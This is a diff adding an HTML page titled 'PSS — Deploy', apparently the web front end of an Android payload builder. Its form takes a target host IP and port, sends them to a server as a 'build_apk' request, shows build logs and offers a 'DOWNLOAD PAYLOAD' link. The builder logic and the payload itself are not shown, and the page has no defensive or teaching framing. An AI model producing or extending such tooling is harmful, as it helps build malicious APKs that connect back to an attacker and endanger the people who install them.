@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>PSS — Deploy</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=JetBrains+Mono:wght@400;600&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --g1:#00ff88;--g2:#00dd77;--g3:#00bb66;--g4:#009955;--g5:#006633;
+    --bg:#050608;--bg2:#0a0c10;--bg3:#0e1116;
+    --border:rgba(0,255,136,.08);--border-h:rgba(0,255,136,.18);
+    --t1:#e8ede9;--t3:#4a5a4e;
+    --mono:'JetBrains Mono',monospace;--sans:'Inter',sans-serif;--display:'Orbitron',sans-serif;
+  }
+  *{margin:0;padding:0;box-sizing:border-box}
+  html,body{width:100%;height:100%;background:var(--bg);color:var(--t1);font-family:var(--sans);overflow:hidden}
+
+  #page{
+    position:relative;z-index:10;
+    display:flex;flex-direction:column;align-items:center;justify-content:center;
+    height:100%;padding:40px;
+    background:radial-gradient(circle at center,rgba(0,255,136,.02) 0%,var(--bg) 70%);
+  }
+
+  .deploy-card{
+    width:100%;max-width:480px;
+    background:rgba(13,17,23,.9);border:1px solid var(--border);
+    border-radius:12px;padding:28px;
+    box-shadow:0 0 60px rgba(0,255,136,.04);position:relative;
+  }
+  .deploy-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(0,255,136,.3),transparent)}
+
+  .title{font-family:var(--display);font-size:14px;color:var(--g1);letter-spacing:4px;margin-bottom:24px;text-align:center;text-shadow:0 0 15px rgba(0,255,136,.25)}
+
+  .form-group{margin-bottom:18px}
+  .label{display:block;font-family:var(--mono);font-size:9px;color:var(--g5);margin-bottom:7px;letter-spacing:2px;font-weight:600}
+
+  input{
+    width:100%;background:var(--bg);border:1px solid var(--border);
+    padding:11px 14px;color:var(--g1);font-family:var(--mono);font-size:12px;
+    border-radius:8px;outline:none;transition:border-color .2s;
+  }
+  input:focus{border-color:var(--g4);box-shadow:0 0 12px rgba(0,255,136,.08)}
+  input::placeholder{color:var(--t3)}
+
+  .deploy-btn{
+    width:100%;padding:12px;background:var(--g5);border:1px solid var(--g3);
+    color:#000;font-family:var(--display);font-size:11px;font-weight:700;letter-spacing:2px;
+    cursor:pointer;border-radius:8px;transition:all .2s;margin-top:8px;
+  }
+  .deploy-btn:hover:not(:disabled){background:var(--g3);box-shadow:0 0 20px rgba(0,255,136,.25);transform:translateY(-1px)}
+  .deploy-btn:disabled{opacity:.4;cursor:not-allowed}
+
+  #status-box{
+    margin-top:20px;padding:14px;background:rgba(0,0,0,.6);
+    border:1px solid var(--border);border-radius:8px;
+    font-family:var(--mono);font-size:10px;color:var(--t3);
+    height:120px;overflow-y:auto;
+  }
+  #status-box::-webkit-scrollbar{width:3px}
+  #status-box::-webkit-scrollbar-thumb{background:rgba(0,255,136,.15);border-radius:2px}
+  .log-line{margin-bottom:4px;border-left:2px solid var(--g5);padding-left:8px}
+  .log-line.success{border-color:var(--g1);color:var(--g1)}
+
+  .download-link{color:var(--g1);text-decoration:underline;cursor:pointer}
+</style>
+</head>
+<body>
+<div id="page">
+  <div class="deploy-card">
+    <div class="title">// DEPLOY STATION</div>
+
+    <div class="form-group">
+      <span class="label">TARGET HOST IP</span>
+      <input type="text" id="host-ip" placeholder="e.g. 192.168.1.100">
+    </div>
+
+    <div class="form-group">
+      <span class="label">TARGET PORT</span>
+      <input type="number" id="host-port" value="7777">
+    </div>
+
+    <button id="build-btn" class="deploy-btn" onclick="startBuild()">INITIALIZE BUILD</button>
+
+    <div id="status-box">
+      <div class="log-line">SYSTEM IDLE — AWAITING PARAMETERS</div>
+    </div>
+  </div>
+</div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+  var socket=io();
+  var buildBtn=document.getElementById('build-btn');
+  var statusBox=document.getElementById('status-box');
+
+  function log(msg,type){
+    var line=document.createElement('div');line.className='log-line '+(type||'');
+    line.textContent='> ['+new Date().toLocaleTimeString()+'] '+msg;
+    statusBox.appendChild(line);statusBox.scrollTop=statusBox.scrollHeight;
+  }
+
+  function startBuild(){
+    var ip=document.getElementById('host-ip').value;
+    var port=document.getElementById('host-port').value;
+    if(!ip){log('ERROR: INVALID HOST','err');return}
+    buildBtn.disabled=true;log('INITIALIZING COMPILER...');
+    socket.emit('build_apk',{ip:ip,port:port});
+  }
+
+  socket.on('build_log',function(data){
+    data.split('\n').forEach(function(l){if(l.trim())log(l.trim())});
+  });
+
+  socket.on('build_success',function(file){
+    var link=document.createElement('a');link.href='/output/'+file;
+    link.className='download-link';link.textContent='DOWNLOAD PAYLOAD';link.target='_blank';
+    var container=document.createElement('div');container.className='log-line success';
+    container.textContent='BUILD COMPLETE: ';container.appendChild(link);
+    statusBox.appendChild(container);statusBox.scrollTop=statusBox.scrollHeight;
+    buildBtn.disabled=false;
+  });
+</script>
+</body>
+</html>
